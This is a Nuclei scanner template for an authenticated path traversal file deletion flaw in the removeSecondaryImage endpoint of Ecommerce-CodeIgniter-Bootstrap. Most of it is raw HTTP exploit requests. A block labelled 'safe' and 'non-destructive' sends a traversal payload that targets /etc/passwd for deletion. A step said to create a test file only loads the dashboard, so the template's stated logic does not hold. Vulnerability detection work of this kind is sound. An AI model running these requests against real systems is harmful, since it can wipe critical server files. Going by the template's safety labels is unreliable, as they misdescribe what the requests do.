id: ecommerce-codeigniter-arbitrary-file-deletion

info:
  name: Ecommerce CodeIgniter - Arbitrary File Deletion
  author: security-researcher
  severity: high
  description: |
    An arbitrary file deletion vulnerability exists in Ecommerce-CodeIgniter-Bootstrap 
    application. The vulnerability is in the removeSecondaryImage method which allows 
    authenticated attackers to delete any file on the server by manipulating the 
    'folder' and 'image' POST parameters using path traversal sequences.
  reference:
    - https://cwe.mitre.org/data/definitions/73.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H
    cvss-score: 8.1
    cwe-id: CWE-73
  tags: file-deletion,path-traversal,codeigniter,authenticated

variables:
  test_file: "nuclei_test_{{rand_base(6)}}.txt"

http:
  - raw:
      # Step 1: Login request (adjust based on actual login mechanism)
      - |
        POST /admin/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        username={{username}}&password={{password}}

      # Step 2: Create a test file to verify deletion
      - |
        GET /admin/dashboard HTTP/1.1
        Host: {{Hostname}}
        Cookie: ci_session={{session}}
        
      # Step 3: Attempt to delete the test file
      - |
        POST /admin/removeSecondaryImage HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest
        Cookie: ci_session={{session}}
        Referer: {{BaseURL}}/admin/publish
        
        folder=../../../&image={{test_file}}

    cookie-reuse: true
    
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - "application/json"
          - "text/html"
        condition: or

      - type: dsl
        dsl:
          - 'contains(body, "success") || len(body) == 0'
        condition: or

    extractors:
      - type: regex
        name: session
        part: header
        regex:
          - 'ci_session=([a-z0-9]+);'
        internal: true

# Safe verification template (non-destructive)
  - raw:
      - |
        POST /admin/removeSecondaryImage HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest
        Cookie: ci_session={{session}}
        Referer: {{BaseURL}}/admin/publish
        
        folder=../../../../../../../../../../etc&image=passwd

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 500
        condition: or

      - type: word
        part: body
        words:
          - "failed to open stream"
          - "No such file or directory"
          - "Permission denied"
        negative: true
        condition: and

      - type: dsl
        dsl:
          - '!contains(body, "error")'